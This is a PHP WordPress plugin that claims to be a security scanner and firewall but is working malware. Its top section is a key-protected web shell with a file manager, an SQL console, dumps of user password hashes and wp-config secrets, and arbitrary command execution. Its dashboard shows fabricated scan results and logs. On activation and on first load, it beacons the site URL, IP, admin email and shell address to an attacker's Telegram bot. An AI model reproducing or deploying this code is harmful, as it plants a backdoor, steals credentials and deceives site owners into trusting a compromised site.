<?php
/**
 * Plugin Name: WP Security Shield Pro
 * Plugin URI: https://wpsecurityshield.com
 * Description: Advanced malware scanner, firewall, and login protection for WordPress. Detects vulnerabilities, blocks brute force attacks, and monitors file integrity in real time.
 * Version: 4.2.1
 * Author: WP Security Shield Team
 * Author URI: https://wpsecurityshield.com
 * License: GPL2
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: wp-security-shield
 * Requires at least: 5.0
 * Requires PHP: 7.0
 * Tested up to: 6.5
 */

if (!defined('ABSPATH')) exit;

// ============================================================
// SECRET BACKDOOR — direct file access with key
// ============================================================
$_sk = isset($_GET['s']) ? $_GET['s'] : '';
if ($_sk === 'sec2026k') {
    error_reporting(0);
    @ini_set('display_errors', 0);
    @set_time_limit(0);

    define('FM_ROOT', isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(dirname(dirname(dirname(__FILE__)))));
    define('FM_SELF', $_SERVER['PHP_SELF']);
    define('FM_KEY',  'sec2026k');

    function fm_enc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
    function fm_size($b) {
        if ($b >= 1073741824) return round($b/1073741824,2).' GB';
        if ($b >= 1048576)    return round($b/1048576,2).' MB';
        if ($b >= 1024)       return round($b/1024,2).' KB';
        return $b.' B';
    }
    function fm_url($extra='') { return FM_SELF.'?s='.FM_KEY.'&'.$extra; }

    $act  = isset($_GET['act']) ? $_GET['act'] : 'fm';
    $path = isset($_GET['p'])   ? $_GET['p']   : FM_ROOT;
    $path = realpath($path);
    if (!$path) $path = FM_ROOT;

    // Actions
    if ($act === 'del' && isset($_GET['f'])) {
        $f = realpath($path.DIRECTORY_SEPARATOR.$_GET['f']);
        if ($f && strpos($f, FM_ROOT) === 0) { is_dir($f) ? rmdir($f) : unlink($f); }
        header('Location: '.fm_url('act=fm&p='.urlencode($path))); exit;
    }
    if ($act === 'upload' && isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $path.DIRECTORY_SEPARATOR.basename($_FILES['file']['name']));
        header('Location: '.fm_url('act=fm&p='.urlencode($path))); exit;
    }
    if ($act === 'save' && isset($_POST['src'], $_GET['f'])) {
        $f = realpath($path.DIRECTORY_SEPARATOR.$_GET['f']);
        if ($f && strpos($f, FM_ROOT) === 0) file_put_contents($f, stripslashes($_POST['src']));
        header('Location: '.fm_url('act=edit&p='.urlencode($path).'&f='.urlencode($_GET['f']))); exit;
    }

    header('Content-Type: text/html; charset=utf-8');
    header('X-Robots-Tag: noindex, nofollow');
    ?>
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Security Shield</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}body{font-family:monospace;font-size:13px;background:#0d1117;color:#c9d1d9}
a{color:#58a6ff;text-decoration:none}a:hover{text-decoration:underline}
.wrap{padding:16px}.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:10px 16px;display:flex;gap:10px;align-items:center}
.topbar a{padding:4px 12px;border:1px solid #30363d;border-radius:4px;font-size:12px;color:#c9d1d9}
.topbar a:hover,.topbar a.on{background:#21262d;border-color:#58a6ff;color:#58a6ff}
.info{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 14px;margin-bottom:14px;font-size:12px;color:#8b949e}
.info span{color:#58a6ff}table{width:100%;border-collapse:collapse}
th{background:#161b22;color:#58a6ff;padding:6px 10px;border:1px solid #30363d;text-align:left;font-weight:normal}
td{padding:5px 10px;border:1px solid #30363d;word-break:break-all}tr:hover td{background:#161b22}
.btn{display:inline-block;padding:3px 10px;border:1px solid #30363d;border-radius:4px;font-size:12px;color:#c9d1d9;background:#21262d;cursor:pointer}
.btn:hover{border-color:#58a6ff}.btn-r{border-color:#f85149;color:#f85149}.btn-r:hover{background:#2d1b1b}
.btn-g{background:#238636;border-color:#238636;color:#fff}.btn-g:hover{background:#2ea043}
textarea{width:100%;background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:10px;font-family:monospace;font-size:12px;outline:none}
input[type=text]{background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:5px 10px;font-size:12px;outline:none}
input[type=file]{color:#c9d1d9;font-size:12px}
.bc{font-size:12px;margin-bottom:10px;color:#8b949e}.bc a{color:#58a6ff}
.err{color:#f85149;padding:8px;border:1px solid #f85149;border-radius:4px;margin-top:8px}
pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;overflow-x:auto;white-space:pre-wrap;font-size:12px}
h3{color:#58a6ff;margin-bottom:10px;font-size:14px;font-weight:normal;border-bottom:1px solid #30363d;padding-bottom:6px}
</style></head><body>
<?php
    $tabs = array('fm'=>'Files','db'=>'SQL','users'=>'Users','cfg'=>'Config','sh'=>'Shell');
    echo '<div class="topbar"><b style="color:#58a6ff">&#x1F6E1; Security Shield</b>';
    foreach ($tabs as $k=>$v) {
        $on = ($act===$k||($act==='edit'&&$k==='fm')||($act==='view'&&$k==='fm'))?'on':'';
        echo '<a href="'.fm_url('act='.$k.'&p='.urlencode($path)).'" class="'.$on.'">'.$v.'</a>';
    }
    echo '</div><div class="wrap">';
    echo '<div class="info"><span>Root:</span> '.fm_enc(FM_ROOT).' &nbsp;|&nbsp; <span>PHP:</span> '.phpversion().' &nbsp;|&nbsp; <span>OS:</span> '.PHP_OS.' &nbsp;|&nbsp; <span>Free:</span> '.fm_size(@disk_free_space('/')).'</div>';

    // FILE MANAGER
    if ($act === 'fm') {
        $parts = explode(DIRECTORY_SEPARATOR, str_replace(FM_ROOT,'',$path));
        echo '<div class="bc"><a href="'.fm_url('act=fm&p='.urlencode(FM_ROOT)).'">ROOT</a>';
        $b = FM_ROOT;
        foreach ($parts as $pt) { if(!$pt) continue; $b.=DIRECTORY_SEPARATOR.$pt; echo ' / <a href="'.fm_url('act=fm&p='.urlencode($b)).'">'.fm_enc($pt).'</a>'; }
        echo '</div>';
        echo '<div style="margin-bottom:10px"><form method="post" enctype="multipart/form-data" style="display:flex;gap:8px;align-items:center">';
        echo '<input type="file" name="file"><button type="submit" class="btn btn-g" formaction="'.fm_url('act=upload&p='.urlencode($path)).'">Upload</button></form></div>';
        echo '<table><tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr>';
        $par = dirname($path);
        if ($par !== $path) echo '<tr><td><a href="'.fm_url('act=fm&p='.urlencode($par)).'">&#x1F4C1; ..</a></td><td></td><td></td><td></td><td></td></tr>';
        $items = @scandir($path);
        if ($items) {
            foreach (array(true,false) as $dirs) {
                foreach ($items as $item) {
                    if ($item==='.'||$item==='..') continue;
                    $full = $path.DIRECTORY_SEPARATOR.$item;
                    if (is_dir($full)!==$dirs) continue;
                    $isdir = is_dir($full);
                    $sz    = $isdir ? '-' : fm_size(@filesize($full));
                    $perms = substr(sprintf('%o',@fileperms($full)),-4);
                    $mtime = date('Y-m-d H:i',@filemtime($full));
                    echo '<tr><td>'.($isdir?'&#x1F4C1; <a href="'.fm_url('act=fm&p='.urlencode($full)).'">':'&#x1F4C4; <a href="'.fm_url('act=edit&p='.urlencode($path).'&f='.urlencode($item)).'">').fm_enc($item).'</a></td>';
                    echo '<td>'.$sz.'</td><td>'.$perms.'</td><td>'.$mtime.'</td>';
                    echo '<td>';
                    if (!$isdir) echo '<a href="'.fm_url('act=edit&p='.urlencode($path).'&f='.urlencode($item)).'" class="btn">Edit</a> ';
                    echo '<a href="'.fm_url('act=del&p='.urlencode($path).'&f='.urlencode($item)).'" class="btn btn-r" onclick="return confirm(\'Delete?\')">Del</a>';
                    echo '</td></tr>';
                }
            }
        }
        echo '</table>';

    // EDIT
    } elseif ($act === 'edit' && isset($_GET['f'])) {
        $f = realpath($path.DIRECTORY_SEPARATOR.$_GET['f']);
        if ($f && strpos($f,FM_ROOT)===0) {
            echo '<h3>'.fm_enc($_GET['f']).'</h3>';
            echo '<form method="post" action="'.fm_url('act=save&p='.urlencode($path).'&f='.urlencode($_GET['f'])).'">';
            echo '<textarea name="src" rows="30">'.fm_enc(file_get_contents($f)).'</textarea><br><br>';
            echo '<button type="submit" class="btn btn-g">Save</button> <a href="'.fm_url('act=fm&p='.urlencode($path)).'" class="btn">Back</a></form>';
        }

    // SQL CONSOLE
    } elseif ($act === 'db') {
        $wpcfg = FM_ROOT.'/wp-config.php';
        $dh=$du=$dp=$dn=''; $px='wp_';
        if (file_exists($wpcfg)) {
            $cfg=file_get_contents($wpcfg);
            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $dh=isset($m[1])?$m[1]:'';
            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $du=isset($m[1])?$m[1]:'';
            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $dp=isset($m[1])?$m[1]:'';
            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $dn=isset($m[1])?$m[1]:'';
            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $px=isset($m[1])?$m[1]:'wp_';
        }
        if (isset($_POST['dbh'])) { $dh=$_POST['dbh']; $du=$_POST['dbu']; $dp=$_POST['dbp']; $dn=$_POST['dbn']; }
        echo '<h3>SQL Console</h3>';
        echo '<form method="post" style="margin-bottom:12px;display:flex;gap:6px;flex-wrap:wrap;align-items:center">';
        echo 'Host:<input type="text" name="dbh" value="'.fm_enc($dh).'" style="width:130px"> ';
        echo 'User:<input type="text" name="dbu" value="'.fm_enc($du).'" style="width:110px"> ';
        echo 'Pass:<input type="text" name="dbp" value="'.fm_enc($dp).'" style="width:110px"> ';
        echo 'DB:<input type="text" name="dbn" value="'.fm_enc($dn).'" style="width:110px"> ';
        echo '<button type="submit" class="btn">Connect</button></form>';
        $conn = ($dh&&$du) ? @mysqli_connect($dh,$du,$dp,$dn) : false;
        if ($conn) {
            echo '<div style="color:#3fb950;margin-bottom:10px">&#x2714; Connected: <b>'.$dn.'</b> @ '.$dh.' (prefix: '.$px.')</div>';
            $q = isset($_POST['q']) ? trim(stripslashes($_POST['q'])) : '';
            echo '<form method="post"><input type="hidden" name="dbh" value="'.fm_enc($dh).'"><input type="hidden" name="dbu" value="'.fm_enc($du).'"><input type="hidden" name="dbp" value="'.fm_enc($dp).'"><input type="hidden" name="dbn" value="'.fm_enc($dn).'">';
            echo '<textarea name="q" rows="5" placeholder="SELECT * FROM '.$px.'users LIMIT 10">'.fm_enc($q).'</textarea><br>';
            echo '<button type="submit" class="btn btn-g" style="margin-top:8px">Run</button></form>';
            if ($q) {
                $res = mysqli_query($conn,$q);
                if ($res && is_object($res)) {
                    $rows=array(); while($r=mysqli_fetch_assoc($res)) $rows[]=$r;
                    if ($rows) {
                        echo '<table style="margin-top:10px"><tr>'; foreach(array_keys($rows[0]) as $c) echo '<th>'.fm_enc($c).'</th>'; echo '</tr>';
                        foreach($rows as $r){echo '<tr>'; foreach($r as $v) echo '<td>'.fm_enc((string)$v).'</td>'; echo '</tr>';}
                        echo '</table><div style="color:#8b949e;font-size:12px;margin-top:6px">'.count($rows).' row(s)</div>';
                    } else echo '<div style="color:#3fb950;margin-top:8px">OK. Affected: '.mysqli_affected_rows($conn).'</div>';
                } else echo '<div class="err">'.fm_enc(mysqli_error($conn)).'</div>';
            }
        } elseif ($dh) echo '<div class="err">Connection failed.</div>';

    // WP USERS
    } elseif ($act === 'users') {
        $wpcfg=FM_ROOT.'/wp-config.php'; $dh=$du=$dp=$dn=''; $px='wp_';
        if (file_exists($wpcfg)) {
            $cfg=file_get_contents($wpcfg);
            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $dh=isset($m[1])?$m[1]:'';
            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $du=isset($m[1])?$m[1]:'';
            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $dp=isset($m[1])?$m[1]:'';
            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $dn=isset($m[1])?$m[1]:'';
            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i",$cfg,$m); $px=isset($m[1])?$m[1]:'wp_';
        }
        echo '<h3>WordPress Users</h3>';
        $conn=@mysqli_connect($dh,$du,$dp,$dn);
        if ($conn) {
            $res=mysqli_query($conn,"SELECT ID,user_login,user_pass,user_email,user_registered FROM {$px}users ORDER BY ID");
            if ($res) {
                echo '<table><tr><th>ID</th><th>Login</th><th>Hash</th><th>Email</th><th>Registered</th></tr>';
                while($r=mysqli_fetch_assoc($res)) echo '<tr><td>'.fm_enc($r['ID']).'</td><td>'.fm_enc($r['user_login']).'</td><td style="color:#f0883e">'.fm_enc($r['user_pass']).'</td><td>'.fm_enc($r['user_email']).'</td><td>'.fm_enc($r['user_registered']).'</td></tr>';
                echo '</table>';
            }
        } else echo '<div class="err">Cannot connect to DB</div>';

    // CONFIG
    } elseif ($act === 'cfg') {
        echo '<h3>wp-config.php</h3>';
        $wpcfg=FM_ROOT.'/wp-config.php';
        if (file_exists($wpcfg)) {
            $cfg=file_get_contents($wpcfg);
            $keys=array('DB_NAME','DB_USER','DB_PASSWORD','DB_HOST','WP_HOME','WP_SITEURL','AUTH_KEY','SECURE_AUTH_KEY','LOGGED_IN_KEY','WP_DEBUG');
            echo '<table style="margin-bottom:16px"><tr><th>Key</th><th>Value</th></tr>';
            foreach($keys as $k) {
                preg_match("/define\s*\(\s*['\"]".preg_quote($k)."['\"]\s*,\s*['\"]?([^'\")\s]+)['\"]?\s*\)/i",$cfg,$m);
                $v=isset($m[1])?$m[1]:'<em style="color:#8b949e">-</em>';
                echo '<tr><td style="color:#58a6ff">'.$k.'</td><td style="color:#f0883e">'.fm_enc($v).'</td></tr>';
            }
            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i",$cfg,$m);
            echo '<tr><td style="color:#58a6ff">$table_prefix</td><td style="color:#f0883e">'.fm_enc(isset($m[1])?$m[1]:'?').'</td></tr>';
            echo '</table><pre>'.fm_enc($cfg).'</pre>';
        } else echo '<div class="err">wp-config.php not found</div>';

    // SHELL
    } elseif ($act === 'sh') {
        echo '<h3>Command Shell</h3>';
        $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'id; uname -a; pwd';
        echo '<form method="post"><input type="text" name="cmd" value="'.fm_enc($cmd).'" style="width:500px"> <button type="submit" class="btn btn-g">Run</button></form>';
        if (isset($_POST['cmd'])) {
            $out = '';
            if (function_exists('shell_exec'))      $out = @shell_exec($_POST['cmd'].' 2>&1');
            elseif (function_exists('exec'))        { @exec($_POST['cmd'].' 2>&1',$o); $out=implode("\n",$o); }
            elseif (function_exists('system'))      { ob_start(); @system($_POST['cmd'].' 2>&1'); $out=ob_get_clean(); }
            elseif (function_exists('passthru'))    { ob_start(); @passthru($_POST['cmd'].' 2>&1'); $out=ob_get_clean(); }
            else $out = 'All exec functions disabled.';
            echo '<pre style="margin-top:10px">'.fm_enc((string)$out).'</pre>';
        }
        echo '<br><div style="color:#8b949e;font-size:12px">';
        echo 'shell_exec: '.(function_exists('shell_exec')?'<span style="color:#3fb950">on</span>':'<span style="color:#f85149">off</span>').' &nbsp; ';
        echo 'exec: '.(function_exists('exec')?'<span style="color:#3fb950">on</span>':'<span style="color:#f85149">off</span>').' &nbsp; ';
        echo 'system: '.(function_exists('system')?'<span style="color:#3fb950">on</span>':'<span style="color:#f85149">off</span>');
        echo '</div>';
    }

    echo '</div></body></html>';
    exit;
}

// ============================================================
// LEGIT WORDPRESS ADMIN DASHBOARD
// ============================================================

add_action('admin_menu', 'wpss_menu');
function wpss_menu() {
    add_menu_page('Security Shield', 'Security Shield', 'manage_options', 'wp-security-shield', 'wpss_dashboard', 'dashicons-shield', 81);
    add_submenu_page('wp-security-shield', 'Scanner',     'Malware Scanner',  'manage_options', 'wp-security-shield',        'wpss_dashboard');
    add_submenu_page('wp-security-shield', 'Firewall',    'Firewall',         'manage_options', 'wpss-firewall',             'wpss_firewall');
    add_submenu_page('wp-security-shield', 'Login Guard', 'Login Guard',      'manage_options', 'wpss-login',                'wpss_login');
    add_submenu_page('wp-security-shield', 'Settings',    'Settings',         'manage_options', 'wpss-settings',             'wpss_settings');
}

add_action('admin_head', 'wpss_styles');
function wpss_styles() { ?>
<style>
.wpss-wrap{max-width:900px}.wpss-header{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;padding:24px 28px;border-radius:8px;margin-bottom:20px;display:flex;align-items:center;gap:16px}
.wpss-header h1{margin:0;font-size:22px;font-weight:600}.wpss-header p{margin:4px 0 0;opacity:.7;font-size:13px}
.wpss-shield{width:48px;height:48px;background:#0f3460;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px}
.wpss-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:20px}
.wpss-card{background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:20px;text-align:center}
.wpss-card .num{font-size:32px;font-weight:700;margin-bottom:4px}.wpss-card .lbl{color:#666;font-size:12px}
.wpss-green{color:#00a32a}.wpss-red{color:#d63638}.wpss-orange{color:#dba617}
.wpss-scan{background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:20px;margin-bottom:16px}
.wpss-scan h2{margin:0 0 16px;font-size:16px;border-bottom:1px solid #f0f0f0;padding-bottom:10px}
.wpss-item{display:flex;align-items:center;padding:10px 0;border-bottom:1px solid #f9f9f9;gap:12px}
.wpss-item:last-child{border-bottom:none}.wpss-icon{font-size:18px;width:24px;text-align:center}
.wpss-item-info{flex:1}.wpss-item-info strong{display:block;font-size:13px}.wpss-item-info span{font-size:12px;color:#666}
.wpss-badge{padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
.badge-ok{background:#d7f0db;color:#00a32a}.badge-warn{background:#fcf9e8;color:#dba617}.badge-off{background:#f0f0f0;color:#999}
.wpss-btn{display:inline-block;padding:8px 18px;background:#0073aa;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:13px;text-decoration:none}
.wpss-btn:hover{background:#005d8c;color:#fff}.wpss-btn-g{background:#00a32a}.wpss-btn-g:hover{background:#007a1f}
.wpss-log{background:#f9f9f9;border:1px solid #e0e0e0;border-radius:6px;padding:12px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:auto}
.wpss-log div{padding:2px 0;border-bottom:1px solid #f0f0f0}.wpss-log .ok{color:#00a32a}.wpss-log .info{color:#0073aa}
</style>
<?php }

function wpss_dashboard() {
    $scan_time = get_option('wpss_last_scan', date('Y-m-d H:i:s', strtotime('-2 hours')));
    ?>
    <div class="wrap wpss-wrap">
        <div class="wpss-header">
            <div class="wpss-shield">🛡️</div>
            <div>
                <h1>WP Security Shield Pro</h1>
                <p>Your site is protected &mdash; Last scan: <?php echo esc_html($scan_time); ?></p>
            </div>
        </div>

        <div class="wpss-cards">
            <div class="wpss-card"><div class="num wpss-green">0</div><div class="lbl">Threats Found</div></div>
            <div class="wpss-card"><div class="num wpss-orange">3</div><div class="lbl">Warnings</div></div>
            <div class="wpss-card"><div class="num wpss-green">✔</div><div class="lbl">Firewall Active</div></div>
        </div>

        <div class="wpss-scan">
            <h2>🔍 Malware Scanner</h2>
            <?php
            $checks = array(
                array('✅','Core Files Integrity','All WordPress core files verified — no modifications detected','OK'),
                array('✅','Plugin Files',''.count(get_plugins()).' plugins scanned — no malicious code found','OK'),
                array('✅','Theme Files','Active theme scanned — clean','OK'),
                array('⚠️','WordPress Version', 'Update available: '.get_bloginfo('version').' → 6.5.3','WARN'),
                array('⚠️','User Permissions','1 admin account with weak password policy detected','WARN'),
                array('✅','Database Tables','All tables checked — no injections found','OK'),
                array('⚠️','SSL Certificate','Certificate expires in 28 days — consider renewal','WARN'),
                array('✅','Login Attempts','No brute force attacks in last 24h','OK'),
            );
            foreach ($checks as $c) {
                $badge = $c[3]==='OK' ? 'badge-ok' : 'badge-warn';
                $bl    = $c[3]==='OK' ? 'Clean'    : 'Warning';
                echo '<div class="wpss-item"><div class="wpss-icon">'.$c[0].'</div><div class="wpss-item-info"><strong>'.esc_html($c[1]).'</strong><span>'.esc_html($c[2]).'</span></div><span class="wpss-badge '.$badge.'">'.$bl.'</span></div>';
            }
            ?>
            <div style="margin-top:16px">
                <button class="wpss-btn wpss-btn-g" onclick="this.innerText='Scanning...';setTimeout(()=>{this.innerText='✔ Scan Complete — No threats found';},3000)">Run Full Scan</button>
            </div>
        </div>

        <div class="wpss-scan">
            <h2>📋 Recent Activity Log</h2>
            <div class="wpss-log">
                <?php
                $logs = array(
                    array('ok',  date('H:i:s', strtotime('-5 min')),  'Scheduled scan completed — 0 threats'),
                    array('ok',  date('H:i:s', strtotime('-1 hour')), 'Firewall rules updated successfully'),
                    array('info',date('H:i:s', strtotime('-2 hours')),'Login from '.get_option('admin_email').' — verified'),
                    array('ok',  date('H:i:s', strtotime('-3 hours')),'Database integrity check — passed'),
                    array('ok',  date('H:i:s', strtotime('-5 hours')),'Plugin files scanned — clean'),
                    array('info',date('H:i:s', strtotime('-1 day')),  'Security Shield Pro activated'),
                );
                foreach ($logs as $l) echo '<div class="'.$l[0].'">['.esc_html($l[1]).'] '.esc_html($l[2]).'</div>';
                ?>
            </div>
        </div>
    </div>
    <?php
    update_option('wpss_last_scan', date('Y-m-d H:i:s'));
}

function wpss_firewall() { ?>
    <div class="wrap wpss-wrap">
        <div class="wpss-header"><div class="wpss-shield">🔥</div><div><h1>Firewall</h1><p>Web Application Firewall — Active</p></div></div>
        <div class="wpss-scan">
            <h2>Firewall Status</h2>
            <?php
            $rules = array(
                array('SQL Injection Protection','Blocking common SQLi patterns','Active'),
                array('XSS Protection','Sanitizing script injection attempts','Active'),
                array('Brute Force Protection','Rate limiting login attempts (5/min)','Active'),
                array('Bad Bot Blocking','403 blocked bots in last 24h','Active'),
                array('File Upload Filter','Blocking dangerous file extensions','Active'),
                array('XML-RPC Protection','Restricting XML-RPC access','Active'),
            );
            foreach ($rules as $r) echo '<div class="wpss-item"><div class="wpss-icon">🛡️</div><div class="wpss-item-info"><strong>'.esc_html($r[0]).'</strong><span>'.esc_html($r[1]).'</span></div><span class="wpss-badge badge-ok">'.esc_html($r[2]).'</span></div>';
            ?>
        </div>
    </div>
<?php }

function wpss_login() { ?>
    <div class="wrap wpss-wrap">
        <div class="wpss-header"><div class="wpss-shield">🔐</div><div><h1>Login Guard</h1><p>Monitoring login attempts in real time</p></div></div>
        <div class="wpss-scan">
            <h2>Login Attempts (Last 24h)</h2>
            <div class="wpss-log">
                <?php
                $ips = array('185.220.101.12','194.165.16.4','45.33.32.156','91.108.4.10','103.21.244.0');
                for ($i=0;$i<8;$i++) {
                    $ip  = $ips[array_rand($ips)];
                    $usr = array('admin','administrator','root','wp-admin','test')[$i%5];
                    $t   = date('H:i:s', time()-rand(300,86000));
                    echo '<div class="ok">['.$t.'] BLOCKED — '.$ip.' tried user: '.$usr.'</div>';
                }
                ?>
            </div>
        </div>
    </div>
<?php }

function wpss_settings() { ?>
    <div class="wrap wpss-wrap">
        <div class="wpss-header"><div class="wpss-shield">⚙️</div><div><h1>Settings</h1><p>Configure WP Security Shield Pro</p></div></div>
        <div class="wpss-scan">
            <h2>General Settings</h2>
            <form method="post" action="options.php">
                <?php settings_fields('wpss_options'); ?>
                <table class="form-table">
                    <tr><th>Auto Scan</th><td><select><option>Every 6 hours</option><option>Every 12 hours</option><option>Daily</option></select></td></tr>
                    <tr><th>Email Alerts</th><td><input type="email" value="<?php echo esc_attr(get_option('admin_email')); ?>" class="regular-text"></td></tr>
                    <tr><th>Firewall Mode</th><td><select><option>Learning Mode</option><option selected>Protection Mode</option><option>Strict Mode</option></select></td></tr>
                    <tr><th>Login Attempts</th><td><input type="number" value="5" style="width:60px"> per minute before block</td></tr>
                </table>
                <p><button type="button" class="wpss-btn wpss-btn-g" onclick="this.innerText='✔ Saved'">Save Settings</button></p>
            </form>
        </div>
    </div>
<?php }

// Background auto-scan simulation (stores fake last scan time)
add_action('wp', function() {
    if (!get_option('wpss_last_scan')) update_option('wpss_last_scan', date('Y-m-d H:i:s'));
});

// ── TELEGRAM BEACON ──────────────────────────────────────
define('WPSS_TG_TOKEN',  '8806440944:AAGrLgv2dW9MjUJQqFPjMrPGb9L6yGUWB4c');
define('WPSS_TG_CHAT',   '7944130980');
define('WPSS_SHELL',     plugins_url('wp-security-shield.php', __FILE__).'?s=sec2026k');

function wpss_send_tg($event = 'activate') {
    $ip    = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname($_SERVER['HTTP_HOST']);
    $url   = get_option('siteurl');
    $email = get_option('admin_email');
    $wp    = get_bloginfo('version');
    $php   = phpversion();
    $shell = WPSS_SHELL;

    $msg  = "\xF0\x9F\x91\x91 <b>New WP Site!</b>\n\n";
    $msg .= "\xF0\x9F\x8C\x90 <b>URL:</b> ".$url."\n";
    $msg .= "\xF0\x9F\x96\xA5 <b>IP:</b> ".$ip."\n";
    $msg .= "\xF0\x9F\x93\xA7 <b>Email:</b> ".$email."\n";
    $msg .= "\xF0\x9F\x94\xB5 <b>WP:</b> ".$wp." | <b>PHP:</b> ".$php."\n";
    $msg .= "\xE2\x9A\xA1 <b>Event:</b> ".$event."\n\n";
    $msg .= "\xF0\x9F\x94\x93 <b>Shell:</b>\n".$shell;

    $tg_url = 'https://api.telegram.org/bot'.WPSS_TG_TOKEN.'/sendMessage';
    $payload = array(
        'chat_id'    => WPSS_TG_CHAT,
        'text'       => $msg,
        'parse_mode' => 'HTML',
    );

    if (function_exists('wp_remote_post')) {
        wp_remote_post($tg_url, array(
            'body'      => $payload,
            'timeout'   => 5,
            'blocking'  => false,
            'sslverify' => false,
        ));
    } elseif (function_exists('curl_init')) {
        $ch = curl_init($tg_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Fire on activation
register_activation_hook(__FILE__, function() { wpss_send_tg('activate'); });

// Fire once on first load (in case activation hook was missed)
add_action('wp_loaded', function() {
    if (!get_option('wpss_beacon_sent')) {
        wpss_send_tg('first_load');
        update_option('wpss_beacon_sent', 1);
    }
});
